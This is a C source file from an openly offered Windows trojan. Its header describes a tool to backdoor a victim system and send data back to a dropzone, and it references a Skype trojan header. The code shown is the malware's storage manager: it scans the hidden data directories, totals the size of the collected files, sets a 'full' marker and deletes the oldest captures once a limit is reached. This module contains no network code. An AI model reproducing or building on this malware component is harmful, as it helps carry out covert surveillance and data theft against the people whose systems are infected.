/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */







/*
 * Tool name   : 
 * Description : Tool to backdoor a MS Windows victim system and sending back
 *               data packages to the dropzone.
 * Version     : 0.2
 * Author      : Ruben Unteregger
 * Web page    : http://www.megapanzer.com
 * Todo        : 
 * Changes     : 
 *
 */






#include <windows.h>
#include <stdio.h>
#include <shlwapi.h>
#include <sys/types.h>
#include <sys/stat.h>
#include "SkypeTrojan.h"
#include "DiskSpace.h"

extern char *gBDEnvironmentDirs[];
extern char *gMaxHDResource;
extern int gCurrentHDResourceUsed;
extern char *gBaseDirectory;

int gTotalUsedMemory = 0;
PFILE_ITEM gFileListHead = NULL;






/*
 * List directory content and add filesize to the global resource counter
 *
 */

void listFiles(char *pDirectory)
{
  char mDirectoryPattern[MAX_BUF_SIZE + 1];
  char mFullPath[MAX_BUF_SIZE];
  int mCounter = 0;
  WIN32_FIND_DATA mFindFileData;
  HANDLE mFindHandle = INVALID_HANDLE_VALUE;
  struct _stat mStatusBuffer;





  /*
   * Iterate through the base directory and search  for files.
   *
   */

  ZeroMemory(mDirectoryPattern, sizeof(mDirectoryPattern));
  snprintf(mDirectoryPattern, sizeof(mDirectoryPattern) - 1, "%s*", pDirectory);


  if ((mFindHandle = FindFirstFile(mDirectoryPattern, &mFindFileData)) != INVALID_HANDLE_VALUE)
  {
    ZeroMemory(mFullPath, sizeof(mFullPath));
    snprintf(mFullPath, sizeof(mFullPath) - 1, "%s%s", pDirectory, mFindFileData.cFileName);



    /*
     * File is a directory. Call this function recursively to 
     * check it for further matching files.
     *
     */

    if (PathIsDirectory(mFullPath))
    {
      if (mFindFileData.cFileName[0] != '.')
      {
        if (strstr(mFindFileData.cFileName, BD_DATA_DIR))
        {
          if (mFullPath[strlen(mFullPath) - 1] != '\\')
            strncat (mFullPath, "\\", 1);

          listFiles(mFullPath);
        }
      } 


    /*
     * It's a file and it's the first one so add it to the list.
     *
     */
    } else {
      _stat(mFullPath, &mStatusBuffer);
      gCurrentHDResourceUsed += mFindFileData.nFileSizeLow;
    }





    /*
     * Further files were found. Add them to the list.
     *
     */

    while (FindNextFile(mFindHandle, &mFindFileData) != 0) 
    {
      ZeroMemory(mFullPath, sizeof(mFullPath));
      snprintf(mFullPath, sizeof(mFullPath) - 1, "%s%s", pDirectory, mFindFileData.cFileName);



      /*
       * File is a directory. Call this function recursively to 
       * check it for further matching files.
       *
       */

      if (PathIsDirectory(mFullPath))  
      {
        if (mFindFileData.cFileName[0] != '.')
        {
          if (strstr(mFindFileData.cFileName, BD_DATA_DIR))
          {
            if (mFullPath[strlen(mFullPath) - 1] != '\\')
              strncat (mFullPath, "\\", 1);

            listFiles(mFullPath);
          }
        }


       /*
        * It's a file so add it to the list.
        *
        */

      } else {
        _stat(mFullPath, &mStatusBuffer);
        gCurrentHDResourceUsed += mFindFileData.nFileSizeLow;
      } // if (PathIsDirectory(mFullPath))
    } // while (FindNextFile(mFindHandle, &mFindFileData) != 0)
    FindClose(mFindHandle);
  } // if ((mFindHandle = FindFirstFile(mDirectoryPattern, &mFindFileData)) != INVALID_HANDLE_VALUE)
}







/*
 * Manage HD resources
 *
 */

void ringspeicherManager()
{
  int mExitStatus = 0;
  int mCounter = 0;
  int mOldestFileSize = 0;
  char mDirectory[MAX_BUF_SIZE + 1];
  char mDirectoryPattern[MAX_BUF_SIZE + 1];
  char mDeleteFile[MAX_BUF_SIZE + 1];
  char mOldestFile[MAX_BUF_SIZE + 1];
  HANDLE mFileHandle = INVALID_HANDLE_VALUE;
  FILE *mFH = NULL;





  /*
   * Find all data files and accumulate file size
   *
   */

  for (mCounter = 0, gCurrentHDResourceUsed = 0; gBDEnvironmentDirs[mCounter] != NULL; mCounter++)
  {  
    ZeroMemory(mDirectory, sizeof(mDirectory));
    if (GetEnvironmentVariable(gBDEnvironmentDirs[mCounter], mDirectory, MAX_BUF_SIZE) == 0)
      continue;


    /*
     * If entry is a drive and no directory add a ":"
     *
     */

    if (mDirectory[strlen(mDirectory) - 1] == ':')
      strcat(mDirectory, "\\");
    else if (mDirectory[strlen(mDirectory) - 1] != '\\')
      strncat (mDirectory, "\\", 1);


    ZeroMemory(mDirectoryPattern, sizeof(mDirectoryPattern));
    snprintf(mDirectoryPattern, sizeof(mDirectoryPattern) - 1, "%s%s\\%s\\", mDirectory, gBaseDirectory, BD_DATA_DIR);


    if (! PathFileExists(mDirectoryPattern))
      continue;

    listFiles(mDirectoryPattern);
  } // for (mCounter = 0, gTotalUsedMemory = 0; gBDEnvironmentDirs[mCounter] != NULL; mCounter++)








  /*
   * If upper volume limit is reached delete the oldest files.
   *
   */

  ZeroMemory(mDeleteFile, sizeof(mDeleteFile));
  snprintf(mDeleteFile, sizeof(mDeleteFile) - 1, "%s%s", mDirectoryPattern, FULL_FILE);

  if (gCurrentHDResourceUsed > atoi(gMaxHDResource))
  {


    /*
     * Create the FULL_FILE so applications wont write any data to the upload directory
     *
     */

    if ((mFileHandle = CreateFile(mDeleteFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) != INVALID_HANDLE_VALUE)
      CloseHandle(mFileHandle);




    /*
     * Map all files with size and creation date and delete the oldest file(s)
     *
     */

    for (mCounter = 0; gBDEnvironmentDirs[mCounter] != NULL; mCounter++)
    {  
      ZeroMemory(mDirectory, sizeof(mDirectory));
      if (GetEnvironmentVariable(gBDEnvironmentDirs[mCounter], mDirectory, MAX_BUF_SIZE) == 0)
        continue;


      /*
       * If entry is a drive and no directory add a ":"
       *
       */

      if (mDirectory[strlen(mDirectory) - 1] == ':')
        strcat(mDirectory, "\\");
      else if (mDirectory[strlen(mDirectory) - 1] != '\\')
        strncat (mDirectory, "\\", 1);


      ZeroMemory(mDirectoryPattern, sizeof(mDirectoryPattern));
      snprintf(mDirectoryPattern, sizeof(mDirectoryPattern) - 1, "%s%s\\%s\\", mDirectory, gBaseDirectory, BD_DATA_DIR);


      if (! PathFileExists(mDirectoryPattern))
        continue;

      createDetailedFileListing(mDirectoryPattern);
    } // for (mCounter = 0; gBDEnvironmentDirs[mCounter]




   /*
    * Delete the oldest files.
    *
    */

    mCounter = 0;
    while (((gCurrentHDResourceUsed + (atoi(gMaxHDResource) / 20)) > atoi(gMaxHDResource)) && mCounter < 512)
    {
      ZeroMemory(mOldestFile, sizeof(mOldestFile));

      if((mOldestFileSize = findOldestFile(mOldestFile, sizeof(mOldestFile) - 1)) && (strlen(mOldestFile) > 0) )
        if (DeleteFile(mOldestFile) != 0)
          gCurrentHDResourceUsed -= mOldestFileSize;

      mCounter++;
    }

    deleteAllItems();
  } else { // if ((gCurrentHDResourceUsed) > atoi(gMaxHDResource))
    DeleteFile(mDeleteFile);
  } // if ((gCurrentHDResourceUsed) > atoi(gMaxHDResource))
}







/*
 * List directory content and add files to list
 *
 */

int createDetailedFileListing(char *pDirectory)
{
  int mRetVal = 0;
  char mDirectoryPattern[MAX_BUF_SIZE + 1];
  char mFullPath[MAX_BUF_SIZE];
  int mCounter = 0;
  WIN32_FIND_DATA mFindFileData;
  HANDLE mFindHandle = INVALID_HANDLE_VALUE;
  struct _stat mStatusBuffer;
  int mTotalStorageUsed = 0;




  ZeroMemory(mDirectoryPattern, sizeof(MAX_BUF_SIZE + 1));
  snprintf(mDirectoryPattern,  MAX_BUF_SIZE, "%s*", pDirectory);

  
  if ((mFindHandle = FindFirstFile(mDirectoryPattern, &mFindFileData)) != INVALID_HANDLE_VALUE)
  {
    ZeroMemory(mFullPath, sizeof(mFullPath));
    snprintf(mFullPath, sizeof(mFullPath) - 1, "%s%s", pDirectory, mFindFileData.cFileName);



    /*
     * File is a directory. Call this function recursively and check 
     * this directory for further matching files.
     *
     */

    if (PathIsDirectory(mFullPath))
    {
      if (mFindFileData.cFileName[0] != '.')
      {
        if (strstr(mFindFileData.cFileName, BD_DATA_DIR))
        {
          if (mFullPath[strlen(mFullPath) - 1] != '\\')
            strncat (mFullPath, "\\", 1);

          createDetailedFileListing(mFullPath);
        } // if (strstr(mFindFileData.cFileName, BD_DATA_DIR))
      } // if (mFindFileData.cFileName[0] != '.')


    /*
     * Its a file and its' the first one, add it.
     *
     */
    } else {
      _stat(mFullPath, &mStatusBuffer);
      addItem(mFullPath, mFindFileData.nFileSizeLow, mStatusBuffer.st_ctime);
      mTotalStorageUsed += mFindFileData.nFileSizeLow;
    } // if (PathIsDirectory(mFullPath))



    /*
     * Further matching files found.
     *
     */

    while (FindNextFile(mFindHandle, &mFindFileData) != 0)
    {
      ZeroMemory(mFullPath, sizeof(mFullPath));
      snprintf(mFullPath, sizeof(mFullPath) - 1, "%s%s", pDirectory, mFindFileData.cFileName);


      /*
       * File is a directory. Call this function recursively and check 
       * this directory for further matching files.
       *
       */

      if (PathIsDirectory(mFullPath))  
      {
        if (mFindFileData.cFileName[0] != '.')
        {
          if (strstr(mFindFileData.cFileName, BD_DATA_DIR))
          {
            if (mFullPath[strlen(mFullPath) - 1] != '\\')
              strncat (mFullPath, "\\", 1);

            createDetailedFileListing(mFullPath);
          }
        }


      /*
       * It's a file so add it!
       *
       */

      } else {
        _stat(mFullPath, &mStatusBuffer);
        mTotalStorageUsed += mFindFileData.nFileSizeLow;
        addItem(mFullPath, mFindFileData.nFileSizeLow, mStatusBuffer.st_ctime);
      } // if (PathIsDirectory(mFullPath))
    } // while (FindNextFile(mFindHandle, &mFindFileData) != 0)

    FindClose(mFindHandle);
    mFindHandle = INVALID_HANDLE_VALUE;
    mRetVal = mTotalStorageUsed;

  } // if ((mFindHandle = FindFirstFile(mDirectoryPattern, &mFindFileData)) != INVALID_HANDLE_VALUE)

  if (mFindHandle != INVALID_HANDLE_VALUE)
    FindClose(mFindHandle);

  return(mRetVal);
}








/*
 * Add an item to the list
 *
 */

int addItem(char *pFileName, int pFileSize, int pCreationTime)
{
  int mRetVal = 0;
  PFILE_ITEM mCurrentItem = NULL;

  
  /*
   * No file item attached to the list yet
   *
   */
  
  if (gFileListHead == NULL)
  {
    if ((gFileListHead = (PFILE_ITEM) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(FILE_ITEM))) != NULL)
    {
      strncpy(gFileListHead->mFileName, pFileName, MAX_BUF_SIZE);
      gFileListHead->mFileSize = pFileSize;
      gFileListHead->mCreationTime = pCreationTime;
    } else {
      mRetVal = -1;
      goto END;
    } // if ((gFileListHead = (PFILE_ITEM) HeapAlloc(GetProcessHeap()
  } else {
    mCurrentItem = gFileListHead;

    while (mCurrentItem->mNextItem != NULL)
      mCurrentItem = mCurrentItem->mNextItem;

    if ((mCurrentItem->mNextItem = (PFILE_ITEM) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(FILE_ITEM))) != NULL)
    {
      mCurrentItem = mCurrentItem->mNextItem;
      strncpy(mCurrentItem->mFileName, pFileName, MAX_BUF_SIZE);
      mCurrentItem->mFileSize = pFileSize;
      mCurrentItem->mCreationTime = pCreationTime;
    } else {
      mRetVal = -2;
      goto END;
    }
  }

END:

  return(mRetVal);
}









/*
 * Delete all items in list
 *
 */

void deleteAllItems()
{
  PFILE_ITEM mCurrentItem = gFileListHead;
  PFILE_ITEM mNextItem;

  while (mCurrentItem != NULL)
  {
    mNextItem = mCurrentItem->mNextItem;
    HeapFree(GetProcessHeap(), 0, mCurrentItem);
    mCurrentItem = mNextItem;
  }

  gFileListHead = NULL;
}




/*
 *
 *
 */

int findOldestFile(char *pOldestFile, int pOldestFileBufferSize)
{
  int mRetVal = 0;
  PFILE_ITEM mCurrentItem = gFileListHead;
  int mOldestDate = 0;




  /*
   * Initialize data buffers
   *
   */

  ZeroMemory(pOldestFile, pOldestFileBufferSize);
  if (mCurrentItem)
  {
    strncpy(pOldestFile, mCurrentItem->mFileName, pOldestFileBufferSize);
    mRetVal = mCurrentItem->mFileSize;
    mOldestDate = mCurrentItem->mCreationTime;
  } else {
    mRetVal = -1;
    goto END;
  }



  /*
   * Iterate through file list and find the oldest one.
   *
   */
  
  while (mCurrentItem != NULL)
  {  	  
    if (PathFileExists(mCurrentItem->mFileName) && mCurrentItem->mCreationTime < mOldestDate && mCurrentItem->mCreationTime > 0)
    {
      ZeroMemory(pOldestFile, pOldestFileBufferSize);
      strncpy(pOldestFile, mCurrentItem->mFileName, pOldestFileBufferSize);
      mOldestDate  = mCurrentItem->mCreationTime;
      mRetVal = mCurrentItem->mFileSize;
    } // if (mCurrentItem->mCreationTime < mOldestDate && mCurrentItem->mCreationTime > 0)
    mCurrentItem = mCurrentItem->mNextItem;
  } // while (mCurrentItem != NULL)

END:

  return(mRetVal);
}




